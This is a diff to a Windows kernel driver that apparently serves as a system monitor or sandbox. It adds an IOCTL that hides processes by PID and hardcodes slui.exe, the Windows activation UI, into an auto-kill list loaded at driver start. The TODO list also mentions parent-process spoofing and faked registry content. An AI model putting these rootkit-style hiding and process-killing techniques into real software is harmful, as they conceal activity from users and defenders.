@@ -9,9 +9,6 @@ Module Name:
 
 TODO:
 
-    - Clean R3 agent
-    - Report as JSON
-
     - WMI mon&pwn 
     - Create Process from with parent by IOCTL
     - Fake registry content by R3 config
@@ -23,6 +20,7 @@ TODO:
 
 DONE:
 
+    - Report as JSON
     - FS Monitor
     - Process Monitor
     - Thread/RemoteThread Monitor
@@ -177,7 +175,9 @@ bool FindKProc(WCHAR* proc) {
 }
 
 bool AddKProc(WCHAR* proc, int len) {
+
     if (!FindHProc(proc)) {
+        KdPrint(("Going to autokill %ws\n", proc));
         for (int i = 0; i < Maxkprocs; i++) {
             if (wcsstr(Kprocs[i], L"-*") != nullptr) {
                 ::wcsncpy_s(Kprocs[i], proc, len / sizeof(WCHAR));
@@ -437,6 +437,17 @@ NTSTATUS DeviceIOCTLHandler(PDEVICE_OBJECT, PIRP Irp) {
             AddKProc(data, size);
             break;
         }
+        case IOCTL_HIDE_BYPID:
+        {
+            auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+            if (size % sizeof(ULONG) != 0) {
+                status = STATUS_INVALID_BUFFER_SIZE;
+                break;
+            }
+            auto Pid = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+            KdPrint(("Going to hide proc with PID %d\n", Pid[0]));
+            hideprocbypid(UlongToHandle(Pid[0]));
+        }
     }
 
     Irp->IoStatus.Status = status;
@@ -463,6 +474,8 @@ NTSTATUS DriverEntry ( _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING Re
     AddProcess(2);
     hprocsinit();
     kprocsinit();
+    WCHAR* proc = (WCHAR*)L"slui.exe";
+    AddKProc(proc, 8*sizeof(WCHAR));
 
     if (NT_SUCCESS( status )) {
 
